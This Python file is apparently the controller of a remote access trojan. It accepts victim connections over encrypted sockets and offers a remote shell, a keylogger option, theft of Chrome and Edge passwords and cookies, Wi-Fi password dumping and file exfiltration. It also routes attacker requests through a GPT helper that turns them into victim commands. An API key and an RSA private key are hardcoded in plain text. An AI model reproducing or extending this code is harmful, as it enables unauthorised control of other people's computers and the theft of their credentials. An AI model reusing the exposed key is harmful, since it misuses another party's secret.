from CryptoAc.Asymmetric.RSA import RSA
from CryptoAc.Symmetric.AEScrypto import AESencryption, md5
from PasswordStealer.WebPasswords import WebPass
from PasswordStealer.outevry import outEverything,gentempDir
from Design.des import Color as cout
from AI.GPT import AiHelp
from base64 import b64decode
import socket,time
import os
import threading



class Server(object):
    
    def __init__(self,IP,PORT,private):
        self.server = socket.socket(
            socket.AF_INET, socket.SOCK_STREAM
        )
        self.server.bind(
            (IP,PORT)
        )
        self.private = private
        self.cout = cout()
        

    def __sync__(self,conn):
        return conn.recv(1) == bytes([114])

        
    def sendMsg(self,conn,msg,aes=False):
        if aes:
            msg = aes.encrypt(msg)
        conn.send(int.to_bytes(len(msg),length=4)[::-1] + msg)
        return self.__sync__(conn)
    
    def readMsg(self,conn,aes=False):
        header = int.from_bytes(conn.recv(4)[::-1])
        msg = bytes()
        while len(msg) < header:
            msg += conn.recv(header-len(msg))
        conn.send(bytes([114]))
        if aes:
            return aes.decrypt(msg)
        return msg

    def __sendCommand__(self,command,conn,aes,dec=True):
        self.sendMsg(conn,command.encode(),aes)
        if dec:return (self.readMsg(conn,aes).decode(errors='replace')).strip()
        return self.readMsg(conn,aes)

    def __roundsIV__(self,aes):
        key,iv = aes.key, aes.iv
        return AESencryption(key,aes.randomIv(iv))

    def __genFirstAesHost__(self,key,conn):
        iv = md5(key).digest()
        aes = AESencryption(key,iv)        
        host = self.__sendCommand__('hostname',conn,aes).strip()
        return self.__roundsIV__(aes),host

    def getShell(self,conn,addr):
        global CONNECT ,CONNECTED
        self.cout.printy(f"Connecting to ",end=''), self.cout.printg(addr[0])
        aes, hostname = self.__genFirstAesHost__(self.__getSymmetricKey__(conn),conn=conn)
        self.cout.getTools(['Reverse Shell','Keylogger','Encypt session','steal passwords'])
        while True:
            key,iv = aes.key, aes.iv
            command = self.filterCommand(
                self.cout.inuptCommand(addr[0],hostname,'Admin'),
                conn,
                addr,
                aes
            )
            if command == bytes([12,123,45,33,55]):
                aes = AESencryption(key,iv)
            elif command:
                if command!= bytes([114, 101, 102, 114, 101, 115, 104, 73, 86]):
                    self.cout.printCommand(self.__sendCommand__(command,conn,aes))
                aes = self.__roundsIV__(aes)
            
                

    def filterCommand(self,command,conn,addr,aes):
        global AIAPI,CONNECTED,CONNECT
        out = False
        try: out = command.split('--out')[1].strip()
        except: pass
        if command.startswith('/AI'):
            if not AIAPI:
                AIAPI = "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"#self.cout.scan('Please enter APiKEy: ')
            try:
                command = AiHelp(AIAPI).translateToCommand(command[3:])
                if command: return command
                return False
            except Exception as e:
                AIAPI = False
                return False
        if command == 'list host':
            self.__getConnected__()
            return False
        elif command[:10] == 'connect to': 
            if command[10:].strip() == addr[0]: self.cout.printr('Already connected.')
            elif self.__isHost__(command[10:].strip()):
                conn.close()
                del CONNECTED[command[10:].strip()] 
                CONNECT = command[10:].strip()
                return False
            else: self.cout.printr("Host doesn't exist")
        elif command.startswith('get chrome passwords'):
            self.__webGather__(conn,aes,'chrome',typeof='webpass',out=out)
            return bytes([12,123,45,33,55])
        elif command == 'get edge passwords':
            self.__webGather__(conn,aes,'edge',typeof='webpass',out=out)
            return bytes([12,123,45,33,55])
        elif command == 'get chrome cookies':
            self.__webGather__(conn,aes,'chrome cookies',typeof='cookies',out=out)
            return bytes([12,123,45,33,55])
        elif command == 'get edge cookies':
            self.__webGather__(conn,aes,'edge cookies',typeof='cookies',out=out)
            return bytes([12,123,45,33,55])
        elif command == 'get wifi passwords': 
            outEverything(
                None,
                None,
                'wifi',
                Data = self.__sendCommand__('get-wifiPasswords',conn,aes)
            )
            return bytes([114, 101, 102, 114, 101, 115, 104, 73, 86])
        elif command.startswith('receive file -p'):
            pathin = command.split('-p')[-1].split('-out')[0].strip()
            out = command.split('-p')[-1].split('-out')[-1].strip()
            f,data = open(out,'wb'),self.__sendCommand__(f'GetFileBytes -pin {pathin}',conn,aes,dec=False)
            if data == bytes([70,105,108,101,32,100,111,101,115,110,39,116,32,101,120,105,115,116]):
                self.cout.printr(f'File {pathin} doesn\'t exist')
            else: f.write(data)
            f.close()
            return bytes([114, 101, 102, 114, 101, 115, 104, 73, 86])
        else: return command


    def __webGather__(self,conn,aes,WEB,typeof,out=False):
        self.sendMsg(conn,f'steale password {WEB}'.encode(),aes)
        GCMkey,key,iv = self.readMsg(conn,aes),aes.key, aes.iv
        path = gentempDir('GatPass',rem=True)
        while True:
            m = self.readMsg(conn,AESencryption(key,iv)).decode().split('\\')[-1].strip()
            if 'end.' == m: break
            f,data = open(os.path.join(path,m+'.db'),'wb'),self.readMsg(conn,AESencryption(key,iv))
            f.write((data)),f.close()
        return outEverything(
            [os.path.join(path)+'\\'+i for i in os.listdir(os.path.join(path))],
            GCMkey,typeof=typeof,out=out,rem=False
        )

    
    def __getSymmetricKey__(self,conn):
        msg = os.urandom(32)
        self.sendMsg(conn,msg)
        while True:
            try:
                key = self.readMsg(conn) 
                if key:
                    key = RSA().decrypt(self.private,key)
                    return key
            except: return False


    def __getConnected__(self):
        global CONNECTED
        self.cout.printg(f"=== Connected users ===")
        for i in list(CONNECTED.keys()):
            self.cout.printy('[+]',end=' ')
            self.cout.printg(f"{i:>2}")
        print()

    def __first__(self):
        global CONNECTED,CONNECT
        while True:
            self.__getConnected__()
            time.sleep(0.5)
            host = self.cout.scan("Please enter host: ").strip()
            if self.__isHost__(host):
                CONNECT = host
                return #self.__handale__() ####test
            else:
                self.cout.printr("doesn't exist")

    def __isHost__(self,host):
        global CONNECTED
        return host in list(CONNECTED.keys())
            
            
    def __handale__(self,conn=None,addr=None,f=False):
        global CONNECTED,CONNECT
        if not conn:
            conn = CONNECTED[CONNECT]
            addr = (tuple((CONNECT,999)))
        host = addr[0]
        while True:
            try:
                if CONNECT == host:
                    CONNECT = str()
                    return self.getShell(conn,addr)
            except Exception as e:
                print(e)
                del CONNECTED[host]
                return conn.close(),self.__first__()
            time.sleep(0.7)
        


    def __start__(self):
        global CONNECTED, AIAPI
        AIAPI, c = False, 0
        self.cout.wellcome(),self.cout.loading('',0.03,77),self.cout.printy('Listening...\n')
        self.server.listen()
        while True:
            conn,addr = self.server.accept()
            CONNECTED[addr[0]] = conn
            T = threading.Thread(target=self.__handale__,args=(conn,addr))
            T.start()
            if c == 0:
                T , c = threading.Thread(target=self.__first__), 1
                T.start()
           
            
CONNECT = str()
CONNECTED = {}
PRIVATE = {
    'd': 13027910529601119532770714799006018758532221546474522081345910859518335353048770622879435526853932922168144193662670098418384776058067274982038741319327315039563876824664120821865467308021604747741482374978421236373890105626356910358872364969449788911385930315792038786137096534802684394126017914996589219129365345451710908561294931820630402621895510359105527704343606516708972262724743820110223979031059886093795956988211290444988969846766044190846849776653062581612482650822741484182977360873610861797285233258908016045213868979980629747995497876603226849599730802169394562164758591698720124394170692383744196178225,
    'n': 24167402767654577565716389815235569967390138512024137497386480228714459623333728107550442019967341332053940559315871104193316625676287327705224404592395885695827727800334356656078494465334764933984362150328647642679827786023792149061377853406629987146126403665715498483598938424562357472270283226106922575054267526543955052845613720230410609968151396625485965130532490768894210017875706817812676831767822251026991167386779935369014898100686467230341800659314991606618373358316608131771884170257420378343129059831609845883841561567536343257616438711061881770390832717316958948348326818632753120572695814500526819624897,
    'e': 65537,
    'p': 147192456755042563868867266063688596540350158676321236583671523401023897816018054477256558397674215728721082059570635262924181651131534800050052076987276807847379918803896453751843125987802045541919288251087971997048483484351159224588478268240778198021759525219687842755570190194319746632920545031398571409709,
    'q': 164189139174936988371535102854813000834458892728889579941433237240591504242894182719955671661677041074569849454798438154344498983804239284843816463883610453583264506144373806897173504866469784877162039346689762942379668947885839817386958876432423506637873396411698023405551108209753796470252648767907059250533
}


if __name__=='__main__':
    print(socket.gethostbyname(socket.gethostname()))
    Server(socket.gethostbyname(socket.gethostname()),999,PRIVATE).__start__()

    
